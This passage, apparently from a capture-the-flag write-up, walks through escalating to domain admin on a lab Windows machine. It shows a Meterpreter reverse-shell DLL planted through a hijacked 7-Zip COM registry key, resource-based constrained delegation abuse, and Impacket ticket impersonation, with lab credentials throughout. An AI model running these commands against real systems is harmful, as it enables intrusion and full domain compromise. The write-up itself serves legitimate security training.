No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: shell.dll
```

Upload it to the target machine.

Set up listener 

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.57
LHOST => 10.10.16.57
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.57:4444 
```

Trying to add our payload to the registry key with `ee.reed` privileges, i get `Access Denied`

```bash
C:\temp>reg add "HKLM\Software\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}\InprocServer32" /ve /d C:\temp\shell.dll /f
reg add "HKLM\Software\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}\InprocServer32" /ve /d C:\temp\shell.dll /f
ERROR: Access is denied.
```

But from the note we know there are `egistry-level adjustments` I decide to try the same as user `bb.morgan`

Also got `Access Denied` 

```powershell
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> reg add "HKLM\Software\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}\InprocServer32" /ve /d C:\temp\shell.dll /f
reg.exe : ERROR: Access is denied.
    + CategoryInfo          : NotSpecified: (ERROR: Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

```

Damn i might looking at this from the wring perspective... The pdf we got was taking about a archive tool.. maybe we should be modifying dll related to that tool. 

Lets query for CLSIDs related to the term `Archive`
```powershell

C:\temp>reg query HKLM\Software\Classes\CLSID /s /f "archive"
reg query HKLM\Software\Classes\CLSID /s /f "archive"

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e2027-217d-11da-b2a4-000e7bbb2b09}
    (Default)    REG_SZ    X509 Attribute Archivekey

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e2027-217d-11da-b2a4-000e7bbb2b09}\ProgID
    (Default)    REG_SZ    X509Enrollment.CX509AttributeArchiveKey.1

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e2027-217d-11da-b2a4-000e7bbb2b09}\VersionIndependentProgID
    (Default)    REG_SZ    X509Enrollment.CX509AttributeArchiveKey

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e2028-217d-11da-b2a4-000e7bbb2b09}
    (Default)    REG_SZ    X509 Attribute Archivekeyhash

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e2028-217d-11da-b2a4-000e7bbb2b09}\ProgID
    (Default)    REG_SZ    X509Enrollment.CX509AttributeArchiveKeyHash.1

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e2028-217d-11da-b2a4-000e7bbb2b09}\VersionIndependentProgID
    (Default)    REG_SZ    X509Enrollment.CX509AttributeArchiveKeyHash

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e2037-217d-11da-b2a4-000e7bbb2b09}
    (Default)    REG_SZ    Certificate Property Archived

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e2037-217d-11da-b2a4-000e7bbb2b09}\ProgID
    (Default)    REG_SZ    X509Enrollment.CCertPropertyArchived.1

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e2037-217d-11da-b2a4-000e7bbb2b09}\VersionIndependentProgID
    (Default)    REG_SZ    X509Enrollment.CCertPropertyArchived

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e203b-217d-11da-b2a4-000e7bbb2b09}
    (Default)    REG_SZ    Certificate Property Archived Key Hash

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e203b-217d-11da-b2a4-000e7bbb2b09}\ProgID
    (Default)    REG_SZ    X509Enrollment.CCertPropertyArchivedKeyHash.1

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{884e203b-217d-11da-b2a4-000e7bbb2b09}\VersionIndependentProgID
    (Default)    REG_SZ    X509Enrollment.CCertPropertyArchivedKeyHash
End of search: 12 match(es) found.
```

We find two unique CLSIDs but there are tied to certificate archiving, not the archiving tool from the memo.
From the memo there was this line 
`Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase.`

The **context menu** is the menu that pops up when you **right-click** something in Windows Explorer.  It’s called “context” because it depends on the **context of what you clicked**

#### Registry Paths for Context Menus

Common locations where right-click entries are registered:

`HKLM\Software\Classes\*\shellex\ContextMenuHandlers HKCU\Software\Classes\*\shellex\ContextMenuHandlers HKLM\Software\Classes\Directory\shellex\ContextMenuHandlers HKCU\Software\Classes\Directory\shellex\ContextMenuHandlers`

```powershell
C:\temp>reg query HKLM\Software\Classes\*\shellex\ContextMenuHandlers
reg query HKLM\Software\Classes\*\shellex\ContextMenuHandlers

HKEY_LOCAL_MACHINE\Software\Classes\*\shellex\ContextMenuHandlers\7-Zip
HKEY_LOCAL_MACHINE\Software\Classes\*\shellex\ContextMenuHandlers\ModernSharing
HKEY_LOCAL_MACHINE\Software\Classes\*\shellex\ContextMenuHandlers\Open With
HKEY_LOCAL_MACHINE\Software\Classes\*\shellex\ContextMenuHandlers\Open With EncryptionMenu
HKEY_LOCAL_MACHINE\Software\Classes\*\shellex\ContextMenuHandlers\Sharing
HKEY_LOCAL_MACHINE\Software\Classes\*\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}
HKEY_LOCAL_MACHINE\Software\Classes\*\shellex\ContextMenuHandlers\{a2a9545d-a0c2-42b4-9708-a0b2badd77c8}
```

We get `7-Zip` 
Let identify its `CLSID`

```powershell
C:\temp>reg query "HKLM\Software\Classes\*\shellex\ContextMenuHandlers\7-Zip"
reg query "HKLM\Software\Classes\*\shellex\ContextMenuHandlers\7-Zip"

HKEY_LOCAL_MACHINE\Software\Classes\*\shellex\ContextMenuHandlers\7-Zip
    (Default)    REG_SZ    {23170F69-40C1-278A-1000-000100020000}

```

```powershell
C:\temp>reg query "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}"
reg query "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}"

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
```

Then with ee.reed privileges i added our payload so that when a user loads the 7-ZIp archive our payload is executed 

```powershell
C:\temp>reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /t REG_SZ /d "C:\temp\shell.dll" /f
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\temp\shell.dll" /f
The operation completed successfully.
```

On our listener we get a shell but it quickly dies 

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.57:4444 
[*] Sending stage (203846 bytes) to 10.10.11.75
[*] Meterpreter session 1 opened (10.10.16.57:4444 -> 10.10.11.75:60587) at 2025-09-02 10:42:51 +0300

meterpreter > 
[*] 10.10.11.75 - Meterpreter session 1 closed.  Reason: Died
```

readding our payload and setting up our listener again .. we get a call back again this time  i got the chance to check which user we are gettign a callback form 

```
[*] Started reverse TCP handler on 10.10.16.57:4444 
[*] Sending stage (203846 bytes) to 10.10.11.75
[*] Meterpreter session 2 opened (10.10.16.57:4444 -> 10.10.11.75:60592) at 2025-09-02 10:45:49 +0300

meterpreter > getuid
Server username: RUSTYKEY\mm.turner
meterpreter > 
[*] 10.10.11.75 - Meterpreter session 2 closed.  Reason: Died
```

I dont know why our shell is unstable. Asking chatgpt i get this response: 

**`When you hijack a COM object that’s only called for a moment (like a context menu handler, or a certificate property object), here’s what happens:`**
1. **`You right-click (or the system triggers that COM object).`**
2. **`Explorer (or another process) loads your malicious DLL.`**
3. **`Your DllMain runs → reverse shell connects.`**
4. **`The host process finishes its job → DLL unloads.`**
5. **`Your session dies immediately (Reason: Died).`**

**`So the problem isn’t that your payload failed, it worked — but the host process doesn’t stay alive long enough to keep your Meterpreter running.`**


#### Impersonating a user using `AddAllowedToAct` privilege
Checking at the permission that mm.turner has... [[Delegation#**3. Resource Based Constrained Delegation (RBCD)**]]

![[Pasted_image_20250902105300.png]]

**`AddAllowedToAct` privilege** often enables impersonation attacks. In this scenario, it lets us configure a computer account to perform delegations. Since we already control **IT-COMPUTER3$**,  we can grant it the right to impersonate any user when communicating with the Domain Controller (DC). Once this is configured, IT-COMPUTER3 can request service tickets on behalf of any user such as `Administrator`without needing that user’s credentials. Only works if the account allows delegation.

Once we get the connection as `mm.turner` we just need to run one command before the session dies to configure IT-COMPUTER3 to be able to perform delegations.

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
```


```powershell
[*] Sending stage (203846 bytes) to 10.10.11.75
[*] Meterpreter session 3 opened (10.10.16.57:4444 -> 10.10.11.75:59236) at 2025-09-02 11:56:48 +0300

meterpreter > shell
Process 6880 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
PS C:\Windows> 
[*] 10.10.11.75 - Meterpreter session 3 closed.  Reason: Died

```

The using the it-computer3 we can try to impersonicate the Administrator

```bash
faketime -f '+8h' \                   
impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate administrator -dc-ip 10.10.11.75 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user IT-COMPUTER3$ or initial TGT not forwardable
                             
```


we are not successful, checking of the `Administrator` allows delegation

```bash
faketime -f '+8h' \
> bloodyAD -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' --host dc.rustykey.htb -k get object administrator

[SNIP]
sAMAccountName: Administrator
sAMAccountType: 805306368
uSNChanged: 184376
uSNCreated: 8196
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; NOT_DELEGATED
whenChanged: 2025-09-02 12:01:54+00:00
whenCreated: 2024-12-27 00:52:32+00:00
```

`NOT_DELEGATED` tells us the account does not allow delegations 

In bloodhound i notice that the account `Backupadmin` is also a member of the Administrator group.

![[Pasted_image_20250902121342.png]]

```bash
faketime -f '+8h' \
impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache   
```

we get a ticket for backupadmin account , but the account is not `Remote Management users` but we have a work around for that 

```bash
export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache           
```

```bash
faketime -f '+8h' \
impacket-wmiexec -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
rustykey\backupadmin

C:\>cd Users\Administrator\Desktop\

C:\Users\Administrator\Desktop>type root.txt
f14d18f7ccdd62f369b3859816a18bc9

C:\Users\Administrator\Desktop>

```

